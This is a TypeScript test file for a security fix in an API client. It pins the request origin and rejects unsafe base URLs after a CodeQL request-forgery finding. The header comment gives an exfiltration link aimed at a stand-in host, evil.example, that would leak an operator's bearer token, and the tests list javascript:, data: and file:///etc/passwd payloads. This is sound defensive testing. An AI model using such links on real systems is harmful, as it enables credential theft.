// test/api-client-base-url.test.ts — CodeQL js/client-side-request-forgery, alerts #32/#33/#52/#54.
//
// THE BUG, end to end. All four alerts point at the four `fetchImpl` call sites in
// packages/api-client/src/client.ts, but they share ONE taint source and it is not in that file:
//
//   apps/dashboard/src/main.ts   readConfig()  ->  baseUrl: params.get("daemon")
//                                                  token:   params.get("token")
//   packages/api-client/.../client.ts          ->  fetch(`${baseUrl}${path}`,
//                                                        { headers: authHeaders(token) })
//
// `?daemon=` is chosen by whoever wrote the link. `?token=` sits next to it. So a link shaped
// `?daemon=https://evil.example&token=<the operator's write token>` sent an authenticated request,
// bearer header included, to a host of the attacker's choosing. This is credential exfiltration by
// query parameter, not a lint nit.
//
// TWO LAYERS closed it: (1) the CLIENT validates the base URL's shape and pins an origin every
// request must stay inside; (2) the dashboard allow-listed which hosts a `?daemon=` could name.
// W1-T4566 deleted apps/dashboard, and with it the `?daemon=` taint source and layer 2. Layer 1 is
// asserted here so the shape cannot be reintroduced by the next client.

import assert from "node:assert/strict";
import { test } from "node:test";
import { createDaemonClient, requestUrl } from "../packages/api-client/src/client.js";

/** A fetch stand-in that records the URL it was asked for and never touches the network. */
function recordingFetch(): { calls: string[]; impl: typeof fetch } {
  const calls: string[] = [];
  const impl = (async (input: unknown) => {
    calls.push(String(input));
    return {
      ok: true,
      status: 200,
      json: async () => ({ tasks: [] }),
      clone() {
        return this;
      },
    } as unknown as Response;
  }) as unknown as typeof fetch;
  return { calls, impl };
}

// ── LAYER 1: the client validates its base URL and pins the origin ───────────────────

test("createDaemonClient refuses a baseUrl whose protocol is not http or https", () => {
  // `javascript:` and `data:` PARSE as URLs — `new URL("javascript:alert(1)")` succeeds — so a
  // bare try/catch around the parse is not a filter. These are script-execution vectors that
  // happen to be URL-shaped, and a client that fetches them is a client that can be made to run
  // attacker script with a bearer token in scope.
  for (const bad of ["javascript:alert(1)", "data:text/html,<script>x</script>", "file:///etc/passwd"]) {
    assert.throws(
      () => createDaemonClient({ baseUrl: bad, token: "t" }),
      /protocol .* is not allowed/,
      `must refuse ${bad}`,
    );
  }
});

test("createDaemonClient refuses a baseUrl that is not an absolute URL at all", () => {
  for (const bad of ["", "not a url", "/v1/status", "//evil.example"]) {
    assert.throws(
      () => createDaemonClient({ baseUrl: bad, token: "t" }),
      /not a valid absolute URL/,
      `must refuse ${JSON.stringify(bad)}`,
    );
  }
});

test("createDaemonClient refuses BEFORE any request is issued, so no token is ever transmitted", async () => {
  // The ordering is the point: validation at construction means a rejected baseUrl never reaches
  // the network layer, so the bearer token cannot leak on the way to discovering the problem.
  const { calls, impl } = recordingFetch();
  assert.throws(() => createDaemonClient({ baseUrl: "javascript:x", token: "SECRET", fetchImpl: impl }));
  assert.deepEqual(calls, [], "no request was issued");
});

test("every client method requests the pinned origin and nothing else", async () => {
  const { calls, impl } = recordingFetch();
  const client = createDaemonClient({ baseUrl: "https://daemon.example.ts.net/", token: "t", fetchImpl: impl });

  await client.getStatus();
  await client.pauseFleet("why");
  await client.listFeedback("new");
  await client.getTrace("fb-1");

  assert.equal(calls.length, 4, `four requests; saw ${JSON.stringify(calls)}`);
  for (const c of calls) {
    assert.equal(new URL(c).origin, "https://daemon.example.ts.net", `${c} stayed on the pinned origin`);
  }
  // The query helper still percent-encodes its values onto the pinned origin rather than being
  // bypassed by the hardening.
  assert.ok(
    calls.some((c) => c.includes("/v1/trace?id=fb-1")),
    `getTrace kept its query; saw ${JSON.stringify(calls)}`,
  );
});

test("a trailing slash on baseUrl does not double up or change the requested path", async () => {
  // The old code stripped trailing slashes by regex before concatenating. The two-argument
  // `new URL(path, base)` form supersedes that; this pins the observable behaviour so the removal
  // of that regex cannot silently change what is requested.
  for (const b of ["http://127.0.0.1:4317", "http://127.0.0.1:4317/", "http://127.0.0.1:4317///"]) {
    const { calls, impl } = recordingFetch();
    await createDaemonClient({ baseUrl: b, token: "t", fetchImpl: impl }).getStatus();
    assert.equal(calls[0], "http://127.0.0.1:4317/v1/status", `baseUrl ${JSON.stringify(b)}`);
  }
});


test("requestUrl refuses a path that escapes the pinned origin", () => {
  // The belt-and-braces arm. Today every call site passes a hardcoded literal so this cannot fire
  // in production — it exists so it still cannot fire the day someone adds a method taking a path
  // fragment from a caller. Both escapes below are real: a protocol-relative `//host` resolves to
  // a DIFFERENT host entirely, and enough `../` walks out of any path prefix.
  const base = new URL("https://daemon.example.ts.net/");

  assert.throws(() => requestUrl(base, "//evil.example/v1/status"), /refusing to request https:\/\/evil\.example/);
  assert.throws(() => requestUrl(base, "https://evil.example/v1/status"), /outside the client's base origin/);

  // ...and an ordinary path, including one with traversal that stays inside, still resolves.
  assert.equal(requestUrl(base, "/v1/status").toString(), "https://daemon.example.ts.net/v1/status");
  assert.equal(requestUrl(base, "/v1/../v1/status").toString(), "https://daemon.example.ts.net/v1/status");
});

